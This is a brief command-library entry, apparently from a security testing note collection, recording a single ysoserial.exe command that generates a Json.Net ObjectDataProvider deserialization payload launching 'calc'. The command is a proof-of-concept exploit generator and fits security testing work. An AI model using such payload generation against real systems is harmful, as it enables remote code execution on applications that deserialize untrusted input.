---
id: 8b9a6095-5256-4cae-a666-b9bae1efc7f0
name: Generate malicious payload using ysoserial.exe
type: command
executor: bash
data: ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
output: null
created_at: '2023-04-06T03:55:59.089019+00:00'
updated_at: '2023-04-06T03:55:59.103650+00:00'
---

# Generate malicious payload using ysoserial.exe

```bash
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```


